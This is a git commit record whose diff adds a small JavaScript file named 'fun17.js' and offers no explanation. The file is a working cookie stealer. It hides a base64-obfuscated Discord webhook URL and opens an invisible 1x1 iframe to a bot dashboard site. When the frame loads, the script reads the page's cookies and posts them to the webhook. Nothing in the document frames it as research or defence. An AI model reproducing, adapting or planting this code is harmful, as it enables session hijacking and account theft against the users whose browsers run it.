b6a08fcf740ae583a72a0b64ec290cb77dd20cc7
wfaderfuiydglaefhioprefoptuy80 <auttpoperationamalgamation29@gmail.com>
2024-08-20 00:02:56 -0400

    Create fun17.js

---
+++ fun17.js
@@ -0,0 +1,24 @@
+const yyy = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSbEgzN090ZGNLZXJkdi1GZ0pGOXJhSE5VdjVzLW4wei11RHE3ay1WOF9ZWEM4NTFNeVVnejhsZA==';
+const bbb = atob(yyy);
+
+const iframe = document.createElement('iframe');
+iframe.src = 'https://cakey.bot/dashboard/public/';
+iframe.width = '1px';
+iframe.height = '1px';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+iframe.onload = function() {
+  function aaa() {
+    const cookies = document.cookie;
+    fetch(bbb, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: `\`${cookies}\``
+      })
+    });
+  }
+  aaa();
+};
